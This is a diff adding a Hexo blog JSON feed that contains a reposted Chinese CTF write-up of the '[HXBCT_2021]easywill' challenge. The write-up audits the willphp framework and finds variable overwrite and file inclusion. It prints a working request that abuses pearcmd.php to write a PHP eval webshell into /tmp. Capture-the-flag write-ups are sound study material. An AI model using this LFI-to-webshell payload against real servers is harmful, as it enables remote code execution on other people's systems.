@@ -1,0 +1,19 @@
+{
+    "version": "https://jsonfeed.org/version/1",
+    "title": "Hexo • All posts by \"willphp2.2\" tag",
+    "description": "",
+    "home_page_url": "http://odiws.github.io",
+    "items": [
+        {
+            "id": "http://odiws.github.io/2024/11/05/HXBCT-2021-easywill/",
+            "url": "http://odiws.github.io/2024/11/05/HXBCT-2021-easywill/",
+            "title": "[HXBCT_2021]easywill",
+            "date_published": "2024-11-05T06:48:54.000Z",
+            "content_html": "<h2 id=\"hxbct_2021easywill\"><a class=\"markdownIt-Anchor\" href=\"#hxbct_2021easywill\">#</a> [HXBCT_2021]easywill</h2>\n<p><img data-src=\"https://i-blog.csdnimg.cn/blog_migrate/e0a25038b09956fb373c468cfd1c6742.png\" alt=\"img\"></p>\n<p>这题 index 上给的代码很短，需要下载框架源码，自行修改审计。我没找到 2.1.5 的源码，下了个最新的。这题比赛的时候看了到 assign 函数还以为是个模板注入的题以为要爆破模板变量名就没去整了。还是对调试这种不太熟吧，下意识不想审计框架的函数调用</p>\n<p>下面开始审计，修改 app/controller/IndexController.php 的内容与题目给出的一致</p>\n<p><img data-src=\"https://i-blog.csdnimg.cn/blog_migrate/9ad16222b7834907d68c96eba474b106.png\" alt=\"img\"></p>\n<p>先跟踪 assign 函数</p>\n<p><img data-src=\"https://i-blog.csdnimg.cn/blog_migrate/40e90aa89ff48f974be1a581fd4b920e.png\" alt=\"img\"></p>\n<p><img data-src=\"https://i-blog.csdnimg.cn/blog_migrate/dd0d0cad4f3b00bcc99a7beae73d032b.png\" alt=\"img\"></p>\n<p>assign 只是做一个赋值的作用 传递给 view 当中</p>\n<p><img data-src=\"https://i-blog.csdnimg.cn/blog_migrate/90d464a14ff58d2d99a85a05a2176487.png\" alt=\"img\"></p>\n<p>再看 view 函数</p>\n<p><img data-src=\"https://i-blog.csdnimg.cn/blog_migrate/4190741973dd63dfef13d2e6d05f23e9.png\" alt=\"img\"></p>\n<p><img data-src=\"https://i-blog.csdnimg.cn/blog_migrate/48e3f9825649f30f662cfc78d5225b17.png\" alt=\"img\"></p>\n<p><img data-src=\"https://i-blog.csdnimg.cn/blog_migrate/2786d46e6353bc38700ca3da07adc943.png\" alt=\"img\"></p>\n<p><img data-src=\"https://i-blog.csdnimg.cn/blog_migrate/629c3064ed9eeef075950e674c36c3ab.png\" alt=\"img\"></p>\n<p>可以看到存在变量覆盖以及文件包含</p>\n<p>开启 debug 可以看到函数调用栈，这里测试传参为 &amp; name=cfile&amp;value=1</p>\n<p><img data-src=\"https://i-blog.csdnimg.cn/blog_migrate/1ce743e5d6245779915f9e6319b65ff7.png\" alt=\"img\"></p>\n<p>写入 shell 到 tmp 目录，这里为什么包含 pearcmd.php 的原因详见：利用 pearcmd.php 从 LFI 到 getshell_feng 的博客 - CSDN 博客</p>\n<p><img data-src=\"https://i-blog.csdnimg.cn/blog_migrate/6a402e8cec85a18bb81515185aef8f59.png\" alt=\"img\"></p>\n<pre><code>/?name=cfile&amp;value=/usr/local/lib/php/pearcmd.php&amp;+-c+/tmp/test2.php+-d+man_dir=&lt;?eval($_POST[0]);?&gt;+-s+\n</code></pre>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202411051504825.png\" alt=\"image-20241105150358707\"></p>\n<p>记得用 burp 浏览器直接打的话 &lt;&gt; 会被 url 编码，写马就不解析了</p>\n<p>转载（没有源码，只能下下来了）：</p>\n<h4 id=\"原文链接httpsblogcsdnnetweixin_43610673articledetails121369384\"><a class=\"markdownIt-Anchor\" href=\"#原文链接httpsblogcsdnnetweixin_43610673articledetails121369384\">#</a> 原文链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzYxMDY3My9hcnRpY2xlL2RldGFpbHMvMTIxMzY5Mzg0\">https://blog.csdn.net/weixin_43610673/article/details/121369384</span></h4>\n",
+            "tags": [
+                "buuctf",
+                "willphp2.2"
+            ]
+        }
+    ]
+}
